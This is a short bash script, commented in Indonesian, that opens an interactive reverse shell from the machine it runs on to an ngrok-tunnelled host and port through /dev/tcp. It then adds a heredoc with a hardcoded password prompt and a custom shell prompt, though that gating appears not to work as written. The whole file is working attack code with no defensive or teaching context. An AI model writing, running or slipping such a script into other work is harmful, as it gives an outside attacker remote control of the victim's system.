#!/bin/bash
# Reverse shell dengan password prompt
bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/10440 0>&1 << 'EOF'
echo -e "\n\033[1;33m=== AKSES TERBATAS ===\033[0m"
read -s -p "Password: " pass
echo
if [[ "$pass" != "Kakaroot1337" ]]; then
    echo -e "\033[1;31m[-] Akses ditolak!\033[0m"
    sleep 1
    exit
fi
echo -e "\033[1;32m[+] Selamat datang, master!\033[0m\n"
export PS1="\[\e[31m\][GSOCKET] \u@\h:\w# \[\e[0m\]"
exec bash
EOF
